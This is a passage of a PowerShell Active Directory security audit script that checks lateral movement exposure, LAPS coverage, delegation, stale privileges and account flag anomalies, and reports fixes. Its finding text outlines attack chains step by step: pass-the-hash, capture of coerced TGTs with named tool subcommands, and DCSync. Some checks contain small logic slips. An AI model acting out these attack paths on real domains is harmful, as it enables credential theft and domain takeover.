        "$($script:AuditWarnings.Count) check(s) could not complete due to access restrictions. Findings may be incomplete. Re-run with Domain Admin credentials for full coverage." `
        -Resources $script:AuditWarnings `
        -Fix "Run: .\Invoke-ADHardening.ps1 -Credential (Get-Credential domain\admin) -DomainController dc01.domain.com" `
        -Pts 0 -Max 0
}

# ===============================================================================
# DOMAIN 31 -- LATERAL MOVEMENT SURFACE
# ===============================================================================
# Models how an attacker with a foothold on one host can pivot across the
# environment using admin logon paths, token delegation, and computer trust.
# Checks: admin account workstation logon restrictions, computers where
# privileged accounts are known to log in (LastLogonDate cross-ref), and
# any account with AdminTo-style access inferred from group membership.
# ===============================================================================
Write-Section "31. LATERAL MOVEMENT SURFACE"

# -----------------------------------------------------------------------------
# 31.1 Privileged accounts without logon workstation restriction
# The userWorkstations attribute limits which machines an account can
# interactively log in from. Admin accounts not restricted to PAWs can be
# used from any compromised endpoint, expanding the lateral movement surface.
# -----------------------------------------------------------------------------
$adminNoRestriction = [System.Collections.Generic.List[string]]::new()
try {
    $adminAccountsFull = @(Get-ADUser -Filter { AdminCount -eq 1 -and Enabled -eq $true } `
        @dcParam -Properties SamAccountName, userWorkstations, LogonWorkstations,
                              'msDS-AllowedToLogon', LastLogonDate -ErrorAction Stop)

    foreach ($adm in $adminAccountsFull) {
        $ws = $adm.userWorkstations
        if ([string]::IsNullOrWhiteSpace($ws)) {
            $adminNoRestriction.Add("$($adm.SamAccountName) [LastLogon:$(if($adm.LastLogonDate){$adm.LastLogonDate.ToString('yyyy-MM-dd')}else{'Never'})]")
        }
    }
}
catch [System.UnauthorizedAccessException] { Write-AuditWarning "31.1 Logon workstation restriction" "Access Denied" "LateralMovement" }
catch { Write-AuditWarning "31.1 Logon workstation restriction" $_.Exception.Message "LateralMovement" }

if ($adminNoRestriction.Count -eq 0) {
    Add-Finding "LateralMovement" "Privileged Account Workstation Restriction" "Good" `
        "All AdminCount=1 accounts have userWorkstations set -- restricting interactive logon to designated PAW hosts" -Pts 6 -Max 6
} else {
    $sev31_1 = if ($adminNoRestriction.Count -gt 10) { 'High' } else { 'Medium' }
    Add-Finding "LateralMovement" "Admin Accounts -- No Workstation Logon Restriction" $sev31_1 `
        "$($adminNoRestriction.Count) AdminCount=1 account(s) have no userWorkstations restriction. These accounts can authenticate interactively from ANY domain-joined host, creating a domain-wide lateral movement surface." `
        -Resources ($adminNoRestriction | Select-Object -First 40) `
        -AttackPath "Compromise any endpoint -> harvest locally cached credentials or use pass-the-hash -> authenticate as unrestricted DA -> DCSync. No PAW required by attacker." `
        -Fix @"
# Restrict each admin account to a specific PAW or admin host:
Set-ADUser -Identity ADM_ACCOUNT -LogonWorkstations 'PAW01,PAW02'
# Or via PowerShell for all AdminCount=1 accounts:
Get-ADUser -Filter {AdminCount -eq 1} | ForEach-Object {
    Set-ADUser -Identity `$_ -LogonWorkstations 'PAW01'
}
# Enable Protected Users group for all tier-0 admins to prevent NTLM/delegation auth.
"@ `
        -MITRE "T1550.002" -CIS "4.3" -Pts 0 -Max 6
    Write-Host "  [!] Admin accounts without workstation restriction: $($adminNoRestriction.Count)" -ForegroundColor DarkYellow
}

# -----------------------------------------------------------------------------
# 31.2 Computers where privileged accounts were recently active
# Cross-references AdminCount=1 accounts' LastLogonDate with all computers'
# LastLogonDate to identify workstations (not DCs) where admins log in.
# Admin logon to a workstation = NTLM hash cached on that box.
# -----------------------------------------------------------------------------
$recentWindow = (Get-Date).AddDays(-30)
try {
    # Workstations (non-DC) that were active recently
    $activeWorkstations = @($script:AllComputers | Where-Object {
        $_.Enabled -and
        $_.LastLogonDate -gt $recentWindow -and
        $_.OperatingSystem -notmatch 'Server' -and
        $_.DistinguishedName -notmatch 'OU=Domain Controllers'
    })

    # Admin accounts active within 30 days
    $activeAdmins = @($script:AdminAccounts | Where-Object {
        $_.Enabled -and $_.LastLogonDate -gt $recentWindow
    })

    # Admins with unconstrained or protocol-transition delegation are highest risk
    $delegatingAdmins = @($activeAdmins | Where-Object {
        $_.TrustedForDelegation -or $_.TrustedToAuthForDelegation
    })

    $lateralRiskSummary = @(
        "Active workstations (non-DC, last 30d): $($activeWorkstations.Count)"
        "Active privileged accounts (last 30d): $($activeAdmins.Count)"
        "Privileged accounts with delegation (highest risk): $($delegatingAdmins.Count)"
    )

    Add-Finding "LateralMovement" "Admin Logon Surface -- Workstation Exposure" "Info" `
        "$($activeAdmins.Count) privileged account(s) active in last 30 days. $($activeWorkstations.Count) active non-server workstations exist as potential admin credential cache targets." `
        -Resources $lateralRiskSummary `
        -AttackPath "Credential cache on any workstation where admin logged in -> $($script:T.MK) $($script:T.SK)::$($script:T.LP) or token impersonation -> move laterally to next hop -> eventually reach DC." `
        -Fix "Enforce credential guard on all workstations. Ensure DAs ONLY log in to DCs/PAWs. Block DA interactive logon to workstations via GPO: Deny log on locally = Domain Admins on all non-PAW GPOs." `
        -MITRE "T1550.002" -Pts 0 -Max 0
}
catch { Write-AuditWarning "31.2 Admin logon surface" $_.Exception.Message "LateralMovement" }

# -----------------------------------------------------------------------------
# 31.3 Local administrator password reuse (LAPS coverage on workstations)
# Without LAPS, all workstations likely share the same local admin password.
# One compromised workstation credential works on all -- classic lateral path.
# -----------------------------------------------------------------------------
try {
    $lapsAttr = 'ms-Mcs-AdmPwdExpirationTime'
    $lapsComputers = @(Get-ADComputer -Filter { Enabled -eq $true } @dcParam `
        -Properties $lapsAttr, OperatingSystem -ErrorAction Stop |
        Where-Object { $_.$lapsAttr -and $_.$lapsAttr -gt 0 })

    $allEnabledComputers =@( @($script:AllComputers | Where-Object { $_.Enabled }))
    $noLaps = @($allEnabledComputers | Where-Object {
        $_.OperatingSystem -match 'Windows' -and
        $_.DistinguishedName -notmatch 'OU=Domain Controllers'
    })
    $lapsCount    = $lapsComputers.Count
    $noLapsCount  = [math]::Max(0, $noLaps.Count - $lapsCount)
    $lapsPct      = if ($noLaps.Count -gt 0) { [math]::Round(($lapsCount / $noLaps.Count) * 100) } else { 100 }

    if ($lapsPct -lt 80) {
        $sev31_3 = if ($lapsPct -lt 50) { 'Critical' } else { 'High' }
        Add-Finding "LateralMovement" "LAPS Coverage Gap -- Local Admin Password Reuse Risk" $sev31_3 `
            "Only $lapsPct% of Windows workstations have LAPS ($lapsCount/$($noLaps.Count)). The remaining $noLapsCount device(s) likely share the same local admin password -- pass-the-hash across all devices." `
            -Resources @("LAPS covered: $lapsCount", "Not covered: $noLapsCount", "Coverage: $lapsPct%") `
            -AttackPath "Compromise one workstation -> extract local admin hash -> pass-the-hash to ALL other workstations sharing same password -> collect domain user credential caches -> lateral movement to DA." `
            -Fix @"
# Deploy LAPS to all Windows workstations:
# 1. Install LAPS MSI on each endpoint (or deploy via GPO software install)
# 2. Enable in GPO: Computer Config -> Admin Templates -> LAPS -> Enable local admin password management
# 3. Schema extension (one-time): Update-AdmPwdADSchema
# 4. Set permissions: Set-AdmPwdComputerSelfPermission -OrgUnit 'OU=Workstations,DC=...'
# Verify coverage: Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime
"@ `
            -MITRE "T1550.002" -CIS "5.4" -Pts 0 -Max 8
        Write-Host "  [!] LAPS coverage: $lapsPct% ($noLapsCount workstations unprotected)" -ForegroundColor Red
    } else {
        Add-Finding "LateralMovement" "LAPS Local Admin Password Coverage" "Good" `
            "LAPS deployed on $lapsPct% of Windows workstations ($lapsCount/$($noLaps.Count)) -- local admin password reuse risk minimal" -Pts 8 -Max 8
    }
}
catch { Write-AuditWarning "31.3 LAPS coverage" $_.Exception.Message "LateralMovement" }

# -----------------------------------------------------------------------------
# 31.4 Computers with unconstrained delegation (non-DC)
# Unconstrained delegation on workstations / member servers means any TGT
# presented to that machine is cached in LSA memory -- extractable with Kerberos TGT dump tools.
# -----------------------------------------------------------------------------
$unconstrainedComps = @($script:AllComputers | Where-Object {
    $_.Enabled -and
    $_.TrustedForDelegation -and
    $_.DistinguishedName -notmatch 'OU=Domain Controllers'
})

if ($unconstrainedComps.Count -eq 0) {
    Add-Finding "LateralMovement" "Computer Unconstrained Delegation" "Good" `
        "No non-DC computers have unconstrained delegation -- Kerberos TGT caching attack surface minimal" -Pts 5 -Max 5
} else {
    Add-Finding "LateralMovement" "Non-DC Computers with Unconstrained Delegation" "Critical" `
        "$($unconstrainedComps.Count) non-DC computer(s) have TrustedForDelegation. Any domain user's TGT is cached in LSASS on these hosts when they connect -- extractable with $($script:T.RB) dump /full." `
        -Resources ($unconstrainedComps | ForEach-Object { "$($_.Name) [$($_.OperatingSystem)]" }) `
        -AttackPath "Printer-Bug/Petit-Potam coerce DC$ auth to unconstrained host -> $($script:T.RB) monitor /interval:5 captures DC TGT -> $($script:T.RB) ptt -> DCSync -> all hashes. No code execution on DC required." `
        -Fix @"
# Convert to resource-based constrained delegation (RBCD):
Set-ADComputer -Identity COMPUTER -TrustedForDelegation `$false
# Migrate services using this computer to RBCD:
# Set-ADComputer -Identity COMPUTER -PrincipalsAllowedToDelegateToAccount (Get-ADComputer SERVICE_HOST)
"@ `
        -MITRE "T1558.001" -CIS "2.3.9" -Pts 0 -Max 5
    Write-Host "  [!!!] Non-DC unconstrained delegation computers: $($unconstrainedComps.Count)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# 31.5 AdminSDHolder propagation lag -- recently de-privileged accounts
# AdminSDHolder propagates protections every 60 min (SDProp). Accounts removed
# from DA still retain AdminCount=1 and the AdminSDHolder DACL until SDProp
# runs AND the AdminCount is manually cleared. These accounts are invisible to
# standard privileged group audits but still have hardened ACLs protecting them.
# -----------------------------------------------------------------------------
try {
    $orphanAdminCount = @(Get-ADUser -Filter { AdminCount -eq 1 } @dcParam `
        -Properties SamAccountName, MemberOf, AdminCount, Enabled -ErrorAction Stop |
        Where-Object {
            $_.AdminCount -eq 1 -and
            -not (
                $_.MemberOf | Where-Object {
                    $_ -match 'Domain Admins|Enterprise Admins|Schema Admins|' +
                               'Administrators|Account Operators|Backup Operators|' +
                               'Server Operators|Print Operators|DnsAdmins|' +
                               'Group Policy Creator|Key Admins'
                }
            )
        })

    if ($orphanAdminCount.Count -gt 0) {
        Add-Finding "LateralMovement" "Orphaned AdminCount=1 -- Ghost Privileged Accounts" "High" `
            "$($orphanAdminCount.Count) account(s) have AdminCount=1 but are NOT members of any privileged group. Likely de-privileged without clearing AdminCount -- retains AdminSDHolder DACL protection (blocks auditing) and may have residual ACL rights elsewhere." `
            -Resources ($orphanAdminCount | ForEach-Object { "$($_.SamAccountName) [Enabled:$($_.Enabled)]" }) `
            -Fix @"
# Clear orphaned AdminCount flags:
Get-ADUser -Filter {AdminCount -eq 1} | Where-Object {
    -not (`$_.MemberOf -match 'Admins|Operators|DnsAdmins|Key Admins')
} | Set-ADUser -Replace @{AdminCount=0}
# Then reset their ACL to inherited:
`$acl = Get-Acl 'AD:\USER_DN'
`$acl.SetAccessRuleProtection(`$false, `$true)
Set-Acl 'AD:\USER_DN' `$acl
"@ `
            -MITRE "T1078.002" -Pts 0 -Max 4
        Write-Host "  [!] Orphaned AdminCount accounts: $($orphanAdminCount.Count)" -ForegroundColor DarkYellow
    } else {
        Add-Finding "LateralMovement" "AdminCount Consistency" "Good" `
            "All AdminCount=1 accounts are current members of at least one privileged group -- no orphaned AdminCount flags detected" -Pts 4 -Max 4
    }
}
catch { Write-AuditWarning "31.5 Orphaned AdminCount" $_.Exception.Message "LateralMovement" }

# ===============================================================================
# DOMAIN 32 -- RBAC ADHERENCE & LEAST PRIVILEGE SCORING
# ===============================================================================
# Evaluates how closely the deployed identity model adheres to the principle of
# least privilege. Detects identity classification drift (user OU != actual
# privileges), role explosion, and accounts with rights far exceeding their
# documented role.
# ===============================================================================
Write-Section "32. RBAC ADHERENCE & LEAST PRIVILEGE SCORING"

# -----------------------------------------------------------------------------
# 32.1 Identity classification drift -- OU placement vs. actual privilege level
# Users in a standard Users OU who hold AdminCount=1 or privileged group
# memberships are not classified correctly -- they bypass tier-based controls.
# -----------------------------------------------------------------------------
$ouDriftRisks = [System.Collections.Generic.List[string]]::new()
try {
    $standardUserOUPattern = 'OU=Users|OU=Staff|OU=Employees|OU=People|OU=Accounts|OU=Finance|OU=HR|OU=Sales|OU=IT(?!.*Admin)'
    $adminOUPattern        = 'OU=Admin|OU=Privileged|OU=Tier|OU=PAW|OU=ServiceAccounts'

    $driftAccounts = @($script:AllUsers | Where-Object {
        $_.Enabled -and
        $_.AdminCount -eq 1 -and
        $_.DistinguishedName -match $standardUserOUPattern -and
        $_.DistinguishedName -notmatch $adminOUPattern
    })

    foreach ($acct in $driftAccounts) {
        $ou = ($acct.DistinguishedName -replace '^[^,]+,','') -replace ',DC=.*','' -replace 'OU=',''
        $ouDriftRisks.Add("Account:$($acct.SamAccountName) | OU:$ou | AdminCount:1")
    }
}
catch { Write-AuditWarning "32.1 Identity classification drift" $_.Exception.Message "RBACAdherence" }

if ($ouDriftRisks.Count -eq 0) {
    Add-Finding "RBACAdherence" "Identity Classification -- OU Placement" "Good" `
        "No AdminCount=1 accounts detected in standard user OUs -- privileged accounts appear correctly separated" -Pts 5 -Max 5
} else {
    Add-Finding "RBACAdherence" "Identity Classification Drift -- Admins in User OUs" "High" `
        "$($ouDriftRisks.Count) AdminCount=1 account(s) are located in standard user OUs, not admin/privileged OUs. Tier-based GPO controls (logon restrictions, software policy) intended for admins do not apply to these accounts." `
        -Resources $ouDriftRisks `
        -Fix "Move admin accounts to the correct tier OU: Move-ADObject -Identity USER_DN -TargetPath 'OU=Tier0,OU=Admins,DC=...' and verify GPO links apply correctly." `
        -MITRE "T1078.002" -CIS "4.1" -Pts 0 -Max 5
    Write-Host "  [!] OU classification drift: $($ouDriftRisks.Count) privileged accounts in wrong OU" -ForegroundColor DarkYellow
}

# -----------------------------------------------------------------------------
# 32.2 Role explosion -- accounts with excessive group membership count
# Detect accounts with group counts far above their peer average in the same OU.
# High group count = accumulated permissions from role changes (copy-user pattern).
# -----------------------------------------------------------------------------
$roleExplosionRisks = [System.Collections.Generic.List[string]]::new()
try {
    # Group users by parent OU
    $ouGroups = $script:AllUsers | Where-Object { $_.Enabled -and $_.MemberOf } |
                Group-Object { ($_.DistinguishedName -replace '^[^,]+,','') -replace ',DC=.*','' }

    foreach ($ouGroup in $ouGroups) {
        $members     = @($ouGroup.Group)
        if ($members.Count -lt 3) { continue }   # need a peer baseline

        $groupCounts = @($members | ForEach-Object { @($_.MemberOf).Count })
        $avgCount    = @([math]::Round(($groupCounts | Measure-Object -Average).Average, 1))
        $threshold   = [math]::Max(20, $avgCount * 2.5)   # 2.5x peer average or min 20

        foreach ($acct in $members) {
            $cnt = @($acct.MemberOf).Count
            if ($cnt -ge $threshold -and $cnt -gt 15) {
                $ou = $ouGroup.Name -replace 'OU=',''
                $roleExplosionRisks.Add("Account:$($acct.SamAccountName) | Groups:$cnt | PeerAvg:$avgCount | OU:$ou")
            }
        }
    }
}
catch { Write-AuditWarning "32.2 Role explosion" $_.Exception.Message "RBACAdherence" }

if ($roleExplosionRisks.Count -eq 0) {
    Add-Finding "RBACAdherence" "Group Membership Sprawl" "Good" `
        "No accounts detected with group membership counts significantly above their peer baseline" -Pts 4 -Max 4
} else {
    Add-Finding "RBACAdherence" "Role Explosion -- Excessive Group Membership vs. Peers" "Medium" `
        "$($roleExplosionRisks.Count) account(s) have group memberships 2.5x above their peer average in the same OU. Typically caused by copy-user provisioning or accumulated roles across job changes." `
        -Resources ($roleExplosionRisks | Select-Object -First 30) `
        -Fix "Conduct access recertification campaign: for each over-provisioned account, compare current groups to job role definition. Remove all groups not tied to current role. Implement role-based provisioning (RBAC) via identity governance tool." `
        -MITRE "T1078" -CIS "16.1" -Pts 0 -Max 4
    Write-Host "  [!] Role explosion outliers: $($roleExplosionRisks.Count)" -ForegroundColor DarkYellow
}

# -----------------------------------------------------------------------------
# 32.3 Copy-user provisioning artifacts -- duplicate permission sets
# When users are provisioned by copying another account, they inherit ALL groups
# of the template. Detects pairs of accounts with nearly identical group sets.
# -----------------------------------------------------------------------------
$copyUserRisks = [System.Collections.Generic.List[string]]::new()
try {
    # Focus on non-admin accounts (admin accounts are expected to be similar)
    $regularUsers = @($script:AllUsers | Where-Object {
        $_.Enabled -and $_.AdminCount -ne 1 -and
        $_.MemberOf -and @($_.MemberOf).Count -gt 5
    } | Select-Object -First 200)   # cap for performance

    for ($i = 0; $i -lt $regularUsers.Count - 1; $i++) {
        $u1    = $regularUsers[$i]
        $grp1  = [System.Collections.Generic.HashSet[string]]::new($u1.MemberOf)
        for ($j = $i + 1; $j -lt [math]::Min($regularUsers.Count, $i + 20); $j++) {
            $u2    = $regularUsers[$j]
            $grp2  = [System.Collections.Generic.HashSet[string]]::new($u2.MemberOf)

            $intersection = [System.Collections.Generic.HashSet[string]]::new($grp1)
            $intersection.IntersectWith($grp2)
            $union        = [System.Collections.Generic.HashSet[string]]::new($grp1)
            $union.UnionWith($grp2)

            if ($union.Count -gt 0) {
                $similarity = [math]::Round(($intersection.Count / $union.Count) * 100)
                if ($similarity -ge 90 -and $intersection.Count -ge 8) {
                    # Same parent OU check
                    $ou1 = $u1.DistinguishedName -replace '^[^,]+,',''
                    $ou2 = $u2.DistinguishedName -replace '^[^,]+,',''
                    if ($ou1 -ne $ou2) { continue }   # different OUs are less suspicious
                    $copyUserRisks.Add("Accounts:$($u1.SamAccountName) <-> $($u2.SamAccountName) | SharedGroups:$($intersection.Count) | Similarity:$similarity%")
                }
            }
        }
    }
}
catch { Write-AuditWarning "32.3 Copy-user provisioning" $_.Exception.Message "RBACAdherence" }

if ($copyUserRisks.Count -eq 0) {
    Add-Finding "RBACAdherence" "Copy-User Provisioning Pattern" "Good" `
        "No accounts with near-identical group membership sets detected -- role-based provisioning appears consistent" -Pts 3 -Max 3
} else {
    Add-Finding "RBACAdherence" "Copy-User Provisioning Artifacts -- Permission Cloning" "Medium" `
        "$($copyUserRisks.Count) account pair(s) share 90%+ identical group memberships in the same OU. Indicates copy-user provisioning: all accumulated permissions of the template cloned to the new user, including inappropriate ones." `
        -Resources ($copyUserRisks | Select-Object -First 20) `
        -Fix "Conduct access recertification for all flagged accounts. Implement role-based provisioning: create role groups (e.g., 'ROLE_Finance_ReadOnly') and provision new users by role assignment, not by copying accounts." `
        -MITRE "T1078" -CIS "16.1" -Pts 0 -Max 3
}

# -----------------------------------------------------------------------------
# 32.4 Accounts with rights to sensitive AD attributes beyond their role
# Checks for non-privileged accounts with GenericWrite or WriteProperty on
# the domain root, krbtgt, or built-in groups -- likely residual access grants.
# -----------------------------------------------------------------------------
$residualACERisks = [System.Collections.Generic.List[string]]::new()

$sensitiveObjects32 = @(
    @{ DN = $domainDN;                                    Label = 'Domain Root' }
    @{ DN = "CN=krbtgt,CN=Users,$domainDN";               Label = 'krbtgt account' }
    @{ DN = "CN=AdminSDHolder,CN=System,$domainDN";        Label = 'AdminSDHolder' }
    @{ DN = "CN=Builtin,$domainDN";                        Label = 'Builtin Container' }
)
if ($privGroupDNs['Domain Admins'])     { $sensitiveObjects32 += @{ DN = $privGroupDNs['Domain Admins'];     Label = 'Domain Admins group' } }
if ($privGroupDNs['Enterprise Admins']) { $sensitiveObjects32 += @{ DN = $privGroupDNs['Enterprise Admins']; Label = 'Enterprise Admins group' } }

foreach ($obj in $sensitiveObjects32) {
    try {
        $acl32 = Get-Acl "AD:\$($obj.DN)" -ErrorAction Stop
        foreach ($ace in $acl32.Access) {
            if ($ace.AccessControlType -ne 'Allow') { continue }
            if ($ace.IdentityReference.Value -match $escalationAuthorisedPattern) { continue }
            if ($ace.IsInherited) { continue }

            $hasWrite = ($ace.ActiveDirectoryRights -band 'GenericAll')   -or
                        ($ace.ActiveDirectoryRights -band 'GenericWrite')  -or
                        ($ace.ActiveDirectoryRights -band 'WriteProperty') -or
                        ($ace.ActiveDirectoryRights -band 'WriteDacl')     -or
                        ($ace.ActiveDirectoryRights -band 'WriteOwner')
            if ($hasWrite) {
                $residualACERisks.Add("Object:$($obj.Label) | Principal:$($ace.IdentityReference.Value) | Right:$($ace.ActiveDirectoryRights)")
            }
        }
    } catch {}
}

if ($residualACERisks.Count -eq 0) {
    Add-Finding "RBACAdherence" "Sensitive Object ACE Hygiene" "Good" `
        "No residual write ACEs on sensitive objects (domain root, krbtgt, AdminSDHolder) from non-admin principals" -Pts 5 -Max 5
} else {
    Add-Finding "RBACAdherence" "Residual ACEs on Sensitive Objects -- Least Privilege Violation" "Critical" `
        "$($residualACERisks.Count) explicit write ACE(s) on highly sensitive AD objects (domain root, krbtgt, AdminSDHolder, privileged groups) granted to non-admin principals. These are not inherited -- manually granted, likely forgotten." `
        -Resources $residualACERisks `
        -Fix "Remove each ACE: Get-Acl 'AD:\OBJECT_DN' | select and remove non-admin write ACEs. Review change history in SIEM (Event 5136) to identify who granted these and when." `
        -MITRE "T1222.001" -CIS "9.4" -Pts 0 -Max 5
    Write-Host "  [!!!] Residual write ACEs on sensitive objects: $($residualACERisks.Count)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# 32.5 Least privilege scoring summary
# Aggregates over-privilege indicators into a least-privilege health score.
# -----------------------------------------------------------------------------
$lpScore = 0
$lpMax   = 10

# Penalise based on counts found above
if ($ouDriftRisks.Count     -eq 0) { $lpScore += 2 }
if ($roleExplosionRisks.Count -eq 0) { $lpScore += 2 }
if ($copyUserRisks.Count     -eq 0) { $lpScore += 2 }
if ($residualACERisks.Count  -eq 0) { $lpScore += 2 }
if (@($script:ServiceAccounts | Where-Object { $_.AdminCount -eq 1 }).Count -eq 0) { $lpScore += 2 }

$lpPct = [math]::Round(($lpScore / $lpMax) * 100)
$lpGrade = switch ($lpPct) {
    { $_ -ge 90 } { 'A -- Excellent least-privilege posture' }
    { $_ -ge 70 } { 'B -- Good; minor gaps remain' }
    { $_ -ge 50 } { 'C -- Moderate over-privilege detected' }
    { $_ -ge 30 } { 'D -- Significant least-privilege violations' }
    default        { 'F -- Critical least-privilege failures; immediate action required' }
}

Add-Finding "RBACAdherence" "Least Privilege Health Score" "Info" `
    "Least Privilege Score: $lpScore/$lpMax ($lpPct%) -- Grade: $lpGrade. Based on: OU drift, role explosion, copy-user patterns, residual ACEs, and service account privilege." `
    -Pts $lpScore -Max $lpMax

# ===============================================================================
# DOMAIN 33 -- LOGON ANOMALY INDICATORS
# ===============================================================================
# Identifies accounts showing behavioural patterns associated with compromise
# or misuse: accounts that have never logged in, accounts with stale LastLogon
# relative to their PasswordLastSet, orphaned SID ACEs (ghost ACEs from deleted
# accounts), and accounts with anomalous UAC flag combinations.
# ===============================================================================
Write-Section "33. LOGON ANOMALY INDICATORS"

# -----------------------------------------------------------------------------
# 33.1 Ghost ACEs -- orphaned SIDs in object ACLs
# When an account is deleted, ACEs referencing its SID become orphaned.
# These cannot be resolved to a name and appear as raw SIDs in ADUC/PowerShell.
# An attacker who recreates an account with the same SID (possible in some
# scenarios) would automatically inherit all these access grants.
# Checks the domain root, AdminSDHolder, and privileged group ACLs.
# -----------------------------------------------------------------------------
$ghostACERisks = [System.Collections.Generic.List[string]]::new()

$ghostCheckObjects = @(
    @{ DN = $domainDN;                                  Label = 'Domain Root' }
    @{ DN = "CN=AdminSDHolder,CN=System,$domainDN";    Label = 'AdminSDHolder' }
    @{ DN = "CN=Policies,CN=System,$domainDN";         Label = 'GPO Policies Container' }
)
foreach ($grpName in @('Domain Admins','Enterprise Admins','Administrators','Backup Operators')) {
    if ($privGroupDNs[$grpName]) {
        $ghostCheckObjects += @{ DN = $privGroupDNs[$grpName]; Label = $grpName }
    }
}

foreach ($obj in $ghostCheckObjects) {
    try {
        $acl33 = Get-Acl "AD:\$($obj.DN)" -ErrorAction Stop
        foreach ($ace in $acl33.Access) {
            $idRef = $ace.IdentityReference
            # Orphaned SIDs cannot be translated to NTAccount -- they stay as raw S-1-5-... strings
            if ($idRef -is [System.Security.Principal.SecurityIdentifier] -or
                $idRef.Value -match '^S-1-5-\d+-\d+-\d+-\d+-\d+$') {
                $ghostACERisks.Add("Object:$($obj.Label) | OrphanedSID:$($idRef.Value) | Rights:$($ace.ActiveDirectoryRights) | Type:$($ace.AccessControlType)")
            }
        }
    } catch {}
}

if ($ghostACERisks.Count -eq 0) {
    Add-Finding "LogonAnomaly" "Ghost ACEs -- Orphaned SID Entries" "Good" `
        "No orphaned SID ACEs found on monitored critical objects -- ACL hygiene is clean" -Pts 4 -Max 4
} else {
    Add-Finding "LogonAnomaly" "Ghost ACEs -- Orphaned SIDs in Critical Object ACLs" "High" `
        "$($ghostACERisks.Count) orphaned SID ACE(s) found on critical objects. These reference deleted accounts. Residual access grants exist for no resolvable identity -- remove immediately to eliminate phantom access paths." `
        -Resources ($ghostACERisks | Select-Object -First 30) `
        -Fix @"
# Find and remove orphaned SID ACEs:
`$obj = 'AD:\OBJECT_DN'
`$acl = Get-Acl `$obj
`$orphaned = `$acl.Access | Where-Object {
    `$_.IdentityReference -is [System.Security.Principal.SecurityIdentifier]
}
`$orphaned | ForEach-Object { `$acl.RemoveAccessRule(`$_) | Out-Null }
Set-Acl `$obj `$acl
"@ `
        -MITRE "T1222.001" -CIS "9.4" -Pts 0 -Max 4
    Write-Host "  [!] Ghost ACEs (orphaned SIDs): $($ghostACERisks.Count)" -ForegroundColor DarkYellow
}

# -----------------------------------------------------------------------------
# 33.2 Accounts with anomalous UAC flag combinations
# UserAccountControl (UAC) flags define how an account behaves. Certain
# combinations are unusual and may indicate tampering:
#   - DONT_REQUIRE_PREAUTH (0x400000) + DONT_EXPIRE_PASSWORD = AS-REP + permanent
#   - PASSWD_NOTREQD (0x0020) on any enabled account = no password enforced
#   - NOT_DELEGATED (0x100000) missing on admin accounts = delegation not blocked
#   - SMARTCARD_REQUIRED (0x40000) on service accounts = broken service logon
# -----------------------------------------------------------------------------
$UAC_PASSWD_NOTREQD      = 0x0020
$UAC_DONT_EXPIRE_PASS    = 0x10000
$UAC_DONT_REQ_PREAUTH    = 0x400000
$UAC_NOT_DELEGATED       = 0x100000
$UAC_SMARTCARD_REQUIRED  = 0x40000
$UAC_ACCOUNT_DISABLED    = 0x0002

$noPasswordRequired = @($script:AllUsers | Where-Object {
    $_.Enabled -and ($_.UserAccountControl -band $UAC_PASSWD_NOTREQD)
})
$preAuthDisabledPermanent = @($script:AllUsers | Where-Object {
    $_.Enabled -and
    ($_.UserAccountControl -band $UAC_DONT_REQ_PREAUTH) -and
    ($_.UserAccountControl -band $UAC_DONT_EXPIRE_PASS)
})
$adminNotDelegationBlocked = @($script:AdminAccounts | Where-Object {
    $_.Enabled -and -not ($_.UserAccountControl -band $UAC_NOT_DELEGATED) -and
    -not $_.SamAccountName -match '^krbtgt$'
})

if ($noPasswordRequired.Count -gt 0) {
    Add-Finding "LogonAnomaly" "Accounts with PASSWD_NOTREQD Flag" "Critical" `
        "$($noPasswordRequired.Count) enabled account(s) have the PASSWD_NOTREQD UAC flag set. These accounts can authenticate with an empty or blank password -- no password enforcement." `
        -Resources ($noPasswordRequired.SamAccountName) `
        -Fix "Clear PASSWD_NOTREQD flag: Set-ADUser -Identity ACCT -Replace @{userAccountControl=(\$user.UserAccountControl -band -bnot 0x20)}. Then set a strong password and enforce policy." `
        -MITRE "T1110" -CIS "1.1.6" -Pts 0 -Max 5
    Write-Host "  [!!!] PASSWD_NOTREQD accounts: $($noPasswordRequired.Count)" -ForegroundColor Red
} else {
    Add-Finding "LogonAnomaly" "PASSWD_NOTREQD Flag" "Good" "No enabled accounts have PASSWD_NOTREQD UAC flag" -Pts 5 -Max 5
}

if ($preAuthDisabledPermanent.Count -gt 0) {
    Add-Finding "LogonAnomaly" "AS-REP Roastable + Password Never Expires" "Critical" `
        "$($preAuthDisabledPermanent.Count) account(s) have DONT_REQUIRE_PREAUTH AND DONT_EXPIRE_PASSWORD. AS-REP roastable with a credential that never expires -- highest-value offline cracking target, no detection required." `
        -Resources ($preAuthDisabledPermanent.SamAccountName) `
        -Fix "Enable pre-auth: Set-ADUser -DoesNotRequirePreAuth `$false. Enforce password expiration. If pre-auth must be disabled, rotate every 90 days and monitor for AS-REP TGT requests (Event 4768 with PA-DATA type 0)." `
        -MITRE "T1558.004" -Pts 0 -Max 5
    Write-Host "  [!!!] AS-REP permanent accounts: $($preAuthDisabledPermanent.Count)" -ForegroundColor Red
} else {
    Add-Finding "LogonAnomaly" "AS-REP + Never-Expire Combination" "Good" `
        "No accounts combine DoesNotRequirePreAuth with PasswordNeverExpires" -Pts 5 -Max 5
}

if ($adminNotDelegationBlocked.Count -gt 0) {
    $sev33_3 = if ($adminNotDelegationBlocked.Count -gt 5) { 'High' } else { 'Medium' }
    Add-Finding "LogonAnomaly" "Admin Accounts Not Marked NOT_DELEGATED" $sev33_3 `
        "$($adminNotDelegationBlocked.Count) AdminCount=1 account(s) do not have the NOT_DELEGATED (Account is sensitive and cannot be delegated) UAC flag. If their TGT is forwarded to a delegating service, it can be used to impersonate them." `
        -Resources ($adminNotDelegationBlocked | Select-Object -First 20 | ForEach-Object { $_.SamAccountName }) `
        -Fix "Set the sensitive flag on all admin accounts: Set-ADUser -Identity ACCT -AccountNotDelegated `$true. Also add to Protected Users group for comprehensive protection." `
        -MITRE "T1558.001" -CIS "2.3.9" -Pts 0 -Max 4
} else {
    Add-Finding "LogonAnomaly" "Admin Account Delegation Block" "Good" `
        "All AdminCount=1 accounts have the NOT_DELEGATED UAC flag set or are in Protected Users" -Pts 4 -Max 4
}

# -----------------------------------------------------------------------------
# 33.3 Accounts with suspicious logon behaviour -- active accounts, never logged on
# Enabled accounts that have never logged on (no LastLogonDate) but have had
# their password recently set are suspicious: could be backdoor accounts
# provisioned and waiting, or provisioned-but-abandoned high-risk accounts.
# -----------------------------------------------------------------------------
